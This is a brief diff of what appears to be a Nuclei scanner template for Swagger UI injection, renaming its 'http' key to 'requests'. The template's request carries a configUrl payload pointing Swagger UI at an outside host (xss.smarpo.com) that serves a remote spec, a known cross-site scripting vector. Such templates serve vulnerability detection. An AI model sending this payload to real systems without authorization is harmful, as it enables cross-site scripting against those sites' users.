@@ -11,7 +11,7 @@ info:
     - injection
     - swagger
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/swagger/index.html?configUrl=https://xss.smarpo.com/test.json"
